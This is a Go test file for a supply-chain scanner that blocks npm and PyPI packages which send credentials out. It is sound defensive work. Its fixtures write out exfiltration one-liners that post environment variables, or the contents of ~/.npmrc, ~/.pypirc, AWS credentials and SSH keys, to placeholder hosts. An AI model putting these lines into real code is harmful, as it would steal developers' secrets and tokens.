package gate

import (
	"context"
	"strings"
	"testing"
)

func TestCredentialPatterns(t *testing.T) {
	for _, tc := range []struct {
		name, path, source, pattern string
	}{
		{"js bulk env", "index.js", `fetch("https://example.invalid", {method: "POST", body: JSON.stringify(process.env)})`, "env-var-exfil-shape"},
		{"ts bulk env", "index.ts", `axios.post(url, JSON . stringify ( process . env ))`, "env-var-exfil-shape"},
		{"python bulk env", "setup.py", `requests.post(url, json=dict(os.environ))`, "env-var-exfil-shape"},
		{"python env copy", "module.py", `payload = os.environ.copy(); httpx.post(url, json=payload)`, "env-var-exfil-shape"},
		{"python env items", "module.py", `payload = list(os.environ.items()); urllib.request.urlopen(url, data=payload)`, "env-var-exfil-shape"},
		{"npm credential file", "install.cjs", `const token = fs.readFileSync(home + '/.npmrc'); fetch(url, {body: token});`, "credential-file-exfil-shape"},
		{"pypi credential file", "setup.py", `requests.post(url, data=open(home + '/.pypirc').read())`, "credential-file-exfil-shape"},
		{"aws credentials", "install.py", `text = Path(home + '/.aws/credentials').read_text(); httpx.post(url, data=text)`, "credential-file-exfil-shape"},
		{"ssh credentials", "install.js", `https.request(url).end(fs.readFileSync(home + '/.ssh/id_ed25519'))`, "credential-file-exfil-shape"},
		{"normal js config", "index.js", `fetch(url, {headers: {Authorization: process.env.API_KEY}})`, ""},
		{"normal python config", "client.py", `requests.get(url, headers={'Authorization': os.environ['API_KEY']})`, ""},
		{"env without network", "index.js", `console.log(JSON.stringify(process.env))`, ""},
		{"credentials without network", "index.js", `fs.readFileSync(home + '/.npmrc')`, ""},
		{"network without file read", "index.js", `const ignored = '.npmrc'; fetch(url)`, ""},
		{"network without credentials", "index.py", `requests.post(url, data=open('README.md').read())`, ""},
		{"documentation", "README.md", `fetch(url, {body: JSON.stringify(process.env)})`, ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			hits := DetectCredentialExfiltration(tc.path, []byte(tc.source))
			if tc.pattern == "" {
				if len(hits) != 0 {
					t.Fatalf("benign control triggered: %+v", hits)
				}
				return
			}
			if patternSet(hits)[tc.pattern] != 3 {
				t.Fatalf("missing %s: %+v", tc.pattern, hits)
			}
		})
	}
}

func TestCredentialPatternsBlockGateAndRedactSource(t *testing.T) {
	for _, eco := range []string{"npm", "pypi"} {
		path, code := "index.js", `fetch('https://example.invalid/SECRET-CANARY', {body: JSON.stringify(process.env)})`
		if eco == "pypi" {
			path, code = "setup.py", `requests.post('https://example.invalid/SECRET-CANARY', json=dict(os.environ))`
		}
		s := NewStaticScan()
		s.Probes = probesWith(eco, stubProbe{tarballURL: "fixture", tarballContents: buildTarball(t, map[string]string{path: code})})
		for _, credentialsOnly := range []bool{false, true} {
			s.CredentialsOnly = credentialsOnly
			result := s.Check(context.Background(), PackageRef{Ecosystem: eco, Name: "fixture", Version: "1"})
			if result.Verdict != VerdictBlock || !strings.Contains(result.Detail, "env-var-exfil-shape") {
				t.Fatalf("%s: expected credential block, got %+v", eco, result)
			}
			if strings.Contains(result.Detail, "SECRET-CANARY") {
				t.Fatal("credential finding exposed raw source")
			}
		}
	}
}

func TestCredentialOnlyScanIgnoresGenericEval(t *testing.T) {
	s := NewStaticScan()
	s.CredentialsOnly = true
	s.Probes = probesWith("npm", stubProbe{tarballURL: "fixture", tarballContents: buildTarball(t, map[string]string{"index.js": "eval(template)"})})
	if r := s.Check(context.Background(), PackageRef{Ecosystem: "npm"}); r.Verdict != VerdictApprove {
		t.Fatalf("generic eval should not be called credential exfiltration: %+v", r)
	}
}
